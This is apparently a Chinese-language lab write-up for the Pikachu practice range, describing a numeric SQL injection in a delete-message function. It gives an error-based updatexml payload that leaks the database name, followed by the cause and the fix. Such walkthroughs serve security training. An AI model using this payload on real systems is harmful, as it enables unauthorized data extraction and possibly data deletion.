# Pikachu | SQL注入 delete注入
## 一、漏洞简介
删除留言功能，GET参数id拼进delete语句，数字型注入。
## 二、环境信息
靶场地址：http://127.0.0.1/pikachu/
关卡路径：/vul/sqli/sqli_delete.php
## 三、复现步骤
1. 删除链接 ?id=1
2. 构造：`?id=1 and updatexml(1,concat(0x7e,database(),0x7e),1)`
3. 访问链接，报错带出数据库信息
## 四、Payload
?id=1 and updatexml(1,concat(0x7e,database(),0x7e),1)
## 五、漏洞原理
delete from xxx where id=$id 直接拼接。
## 六、修复方案
预编译、权限校验。
## 七、总结
删除类注入很危险，不要直接把id拼SQL。